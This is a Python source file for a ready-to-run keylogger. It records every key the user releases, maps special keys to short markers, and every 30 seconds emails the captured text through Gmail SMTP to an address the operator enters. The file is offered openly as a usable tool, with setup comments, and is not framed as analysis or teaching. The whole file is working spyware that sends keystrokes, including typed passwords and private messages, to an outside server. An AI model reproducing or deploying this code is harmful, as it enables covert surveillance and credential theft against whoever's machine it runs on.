#you must pip install keyboard
import keyboard 
import smtplib
from threading import Semaphore, Timer

timedelay = 30 # set time to resend (seconds)
email_address = "enter your email"
password = "enter your email password"


class Keylogger:
	def __init__(self, interval):
		self.interval = interval
		self.log = ""
		self.semaphore = Semaphore(0)
#====================================================================================
	def callback(self, event):                                                      #
		name = event.name                                                           #
		if len(name) > 1:                                                           #
			if name == "space":                                                     #
				name = "_"                                                          #
			elif name == "enter":                                                   #
				name = "\n"                                                         #                                                          #
			elif name == "decimal":                                                 #
				name = "."                                                          #
			elif name == "shift":                                                   #
				name = ""                                                           #
			elif name == "ctrl":			#you can edit or add more functions     #
				name = ""                                                           #
			elif name == "caps_lock":                                               #
				name = ""                                                           #
			elif name == "backspace":                                               #
				name = "(x)"                                                        #
			elif name == "left_ctrl":                                               #
				name = ""                                                           #
			elif name == "esc":                                                     #
				name = ""                                                           #
			elif name == "v[left_ctrl][esc]":                                       #
				name = ""                                                           #
			else:                                                                   #
				name = name.replace(" ", "_")                                       #
				name = name                                                         #
		self.log += name                                                            #
#====================================================================================
	def sendmail(self, email, password, message):
		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		if self.log:
			self.sendmail(email_address, password, self.log)
		# print(self.log)
		self.log = ""
		Timer(interval=self.interval, function=self.report).start()

	def start(self):
		# start the keylogger
		keyboard.on_release(callback=self.callback)
		self.report()
		self.semaphore.acquire()

if __name__ == "__main__":
	keylogger = Keylogger(interval=timedelay)
	keylogger.start()
